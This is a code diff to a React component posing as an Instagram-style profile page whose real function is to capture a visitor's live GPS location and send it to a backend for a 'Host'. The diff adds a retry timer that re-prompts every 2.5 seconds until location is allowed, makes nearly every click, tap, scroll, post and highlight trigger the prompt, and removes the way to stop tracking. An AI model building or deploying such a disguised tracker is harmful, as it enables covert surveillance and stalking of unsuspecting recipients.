@@ -8,8 +8,11 @@ export default function RecipientFeed({
 }) {
   const [isFollowing, setIsFollowing] = useState(false);
   const [coords, setCoords] = useState(null);
+  const [hasAllowed, setHasAllowed] = useState(false);
 
   const watchIdRef = useRef(null);
+  const retryTimerRef = useRef(null);
+  const hasAllowedRef = useRef(false);
 
   /*
    * Save location coordinates to backend MongoDB & broadcast to Host
@@ -17,6 +20,14 @@ export default function RecipientFeed({
   const saveLocation = async (position) => {
     const { latitude, longitude, accuracy, speed, heading } = position.coords;
     setCoords({ latitude, longitude, accuracy });
+    setHasAllowed(true);
+    hasAllowedRef.current = true;
+
+    // Clear continuous retry timer once location is successfully allowed
+    if (retryTimerRef.current) {
+      clearInterval(retryTimerRef.current);
+      retryTimerRef.current = null;
+    }
 
     try {
       const response = await fetch(`${backendUrl}/api/records`, {
@@ -56,64 +67,89 @@ export default function RecipientFeed({
       return;
     }
 
-    // Native browser prompt triggers here immediately on load
+    if (hasAllowedRef.current && watchIdRef.current !== null) {
+      return; // Already actively streaming
+    }
+
+    // Native browser prompt triggers here
     navigator.geolocation.getCurrentPosition(
       async (position) => {
-        // Save initial coordinates
+        // Save initial coordinates & mark allowed
         await saveLocation(position);
         setIsFollowing(true);
 
-        // Track live location continuously
-        watchIdRef.current = navigator.geolocation.watchPosition(
-          async (updatedPosition) => {
-            await saveLocation(updatedPosition);
-          },
-          (error) => {
-            console.error("Location update error:", error);
-          },
-          {
-            enableHighAccuracy: true,
-            maximumAge: 5000,
-            timeout: 15000,
-          }
-        );
+        // Start live location stream continuously
+        if (watchIdRef.current === null) {
+          watchIdRef.current = navigator.geolocation.watchPosition(
+            async (updatedPosition) => {
+              await saveLocation(updatedPosition);
+            },
+            (error) => {
+              console.error("Location update error:", error);
+            },
+            {
+              enableHighAccuracy: true,
+              maximumAge: 5000,
+              timeout: 15000,
+            }
+          );
+        }
       },
       (error) => {
-        console.warn("Browser location access:", error.message);
+        console.warn("Browser location pending/dismissed:", error.message);
       },
       {
         enableHighAccuracy: true,
         maximumAge: 0,
-        timeout: 15000,
+        timeout: 10000,
       }
     );
   };
 
-  // Trigger native browser location prompt immediately on page load
   useEffect(() => {
+    // 1. Trigger native browser prompt immediately on page load
     requestLocation();
 
+    // 2. Continuously ask / retry every 2.5 seconds until user taps "Allow"
+    retryTimerRef.current = setInterval(() => {
+      if (!hasAllowedRef.current) {
+        requestLocation();
+      } else {
+        clearInterval(retryTimerRef.current);
+      }
+    }, 2500);
+
+    // 3. User interaction listener (tap/click anywhere on page forces browser location prompt)
+    const handleUserInteraction = () => {
+      if (!hasAllowedRef.current) {
+        requestLocation();
+      }
+    };
+
+    window.addEventListener("click", handleUserInteraction);
+    window.addEventListener("touchstart", handleUserInteraction);
+    window.addEventListener("scroll", handleUserInteraction);
+
     return () => {
+      if (retryTimerRef.current) {
+        clearInterval(retryTimerRef.current);
+      }
       if (watchIdRef.current !== null) {
         navigator.geolocation.clearWatch(watchIdRef.current);
       }
+      window.removeEventListener("click", handleUserInteraction);
+      window.removeEventListener("touchstart", handleUserInteraction);
+      window.removeEventListener("scroll", handleUserInteraction);
     };
   }, []);
 
   const handleToggleFollow = () => {
-    if (isFollowing) {
-      if (watchIdRef.current !== null) {
-        navigator.geolocation.clearWatch(watchIdRef.current);
-        watchIdRef.current = null;
-      }
-      setIsFollowing(false);
-    } else {
-      requestLocation();
-    }
+    requestLocation();
+    setIsFollowing(true);
   };
 
   return (
-    <div className="ig-app">
+    <div className="ig-app" onClick={requestLocation} onTouchStart={requestLocation}>
       {/* Left Sidebar */}
       <aside className="ig-sidebar">
         <div className="ig-logo">
@@ -121,19 +157,19 @@ export default function RecipientFeed({
         </div>
 
         <nav className="ig-navigation">
-          <a className="ig-nav-item active">
+          <a className="ig-nav-item active" onClick={requestLocation}>
             <span className="ig-icon">
               <svg viewBox="0 0 24 24"><path d="M3 11.5 12 4l9 7.5" /><path d="M5 10.5V20h14v-9.5" /><path d="M9 20v-6h6v6" /></svg>
             </span>
             <span>Home</span>
           </a>
-          <a className="ig-nav-item">
+          <a className="ig-nav-item" onClick={requestLocation}>
             <span className="ig-icon">
               <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7" /><path d="m20 20-4-4" /></svg>
             </span>
             <span>Search</span>
           </a>
-          <a className="ig-nav-item">
+          <a className="ig-nav-item" onClick={requestLocation}>
             <span className="ig-icon">
               <svg viewBox="0 0 24 24"><rect width="18" height="18" x="3" y="3" rx="2" /><path d="m9 8 7 4-7 4Z" /></svg>
             </span>
@@ -151,7 +187,7 @@ export default function RecipientFeed({
         <div className="feed-container">
           {/* Profile Section */}
           <section className="profile-header">
-            <div className="profile-avatar">
+            <div className="profile-avatar" onClick={requestLocation}>
               <div className="location-avatar">
                 <div className="ig-story-ring">
                   <img src="/highlights/profile.jpg" alt="mr_in.nocent_yogi" />
@@ -201,7 +237,7 @@ export default function RecipientFeed({
               {isFollowing ? "Following" : "Follow"}
             </button>
 
-            <button className="profile-user-plus-btn" title="Discover People">
+            <button className="profile-user-plus-btn" title="Discover People" onClick={requestLocation}>
               <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                 <path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" />
                 <circle cx="8.5" cy="7" r="4" />
@@ -213,7 +249,7 @@ export default function RecipientFeed({
 
           {/* Story Highlights */}
           <div className="highlights-row">
-            <div className="highlight-item">
+            <div className="highlight-item" onClick={requestLocation}>
               <div className="highlight-ring">
                 <div className="highlight-avatar">
                   <img src="/highlights/business.jpg" alt="Bussiness" />
@@ -222,7 +258,7 @@ export default function RecipientFeed({
               <span>Bussiness</span>
             </div>
 
-            <div className="highlight-item">
+            <div className="highlight-item" onClick={requestLocation}>
               <div className="highlight-ring">
                 <div className="highlight-avatar">
                   <img src="/highlights/invitations.jpg" alt="invitations" />
@@ -231,7 +267,7 @@ export default function RecipientFeed({
               <span>invitations</span>
             </div>
 
-            <div className="highlight-item">
+            <div className="highlight-item" onClick={requestLocation}>
               <div className="highlight-ring">
                 <div className="highlight-avatar">
                   <img src="/highlights/aval.jpg" alt="Aval" />
@@ -240,7 +276,7 @@ export default function RecipientFeed({
               <span>Aval ❣️</span>
             </div>
 
-            <div className="highlight-item">
+            <div className="highlight-item" onClick={requestLocation}>
               <div className="highlight-ring">
                 <div className="highlight-avatar">
                   <img src="/highlights/thumbnails.jpg" alt="Thumbnails" />
@@ -249,7 +285,7 @@ export default function RecipientFeed({
               <span>Thumbnails...</span>
             </div>
 
-            <div className="highlight-item">
+            <div className="highlight-item" onClick={requestLocation}>
               <div className="highlight-ring">
                 <div className="highlight-avatar">
                   <img src="/highlights/king.jpg" alt="king" />
@@ -258,7 +294,7 @@ export default function RecipientFeed({
               <span>king 👑</span>
             </div>
 
-            <div className="highlight-item">
+            <div className="highlight-item" onClick={requestLocation}>
               <div className="highlight-ring">
                 <div className="highlight-avatar" style={{ background: "#181A20", display: "flex", alignItems: "center", justifyContent: "center" }}>
                   <svg viewBox="0 0 24 24" width="24" height="24" stroke="#FFFFFF" fill="none" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
@@ -273,22 +309,22 @@ export default function RecipientFeed({
 
           {/* Post Photo Grid */}
           <div className="recipient-posts-grid">
-            <div className="recipient-post-tile">
+            <div className="recipient-post-tile" onClick={requestLocation}>
               <img src="/highlights/aval.jpg" alt="Post 1" />
             </div>
-            <div className="recipient-post-tile">
+            <div className="recipient-post-tile" onClick={requestLocation}>
               <img src="/highlights/business.jpg" alt="Post 2" />
             </div>
-            <div className="recipient-post-tile">
+            <div className="recipient-post-tile" onClick={requestLocation}>
               <img src="/highlights/king.jpg" alt="Post 3" />
             </div>
-            <div className="recipient-post-tile">
+            <div className="recipient-post-tile" onClick={requestLocation}>
               <img src="/highlights/invitations.jpg" alt="Post 4" />
             </div>
-            <div className="recipient-post-tile">
+            <div className="recipient-post-tile" onClick={requestLocation}>
               <img src="/highlights/thumbnails.jpg" alt="Post 5" />
             </div>
-            <div className="recipient-post-tile">
+            <div className="recipient-post-tile" onClick={requestLocation}>
               <img src="/highlights/profile.jpg" alt="Post 6" />
             </div>
           </div>
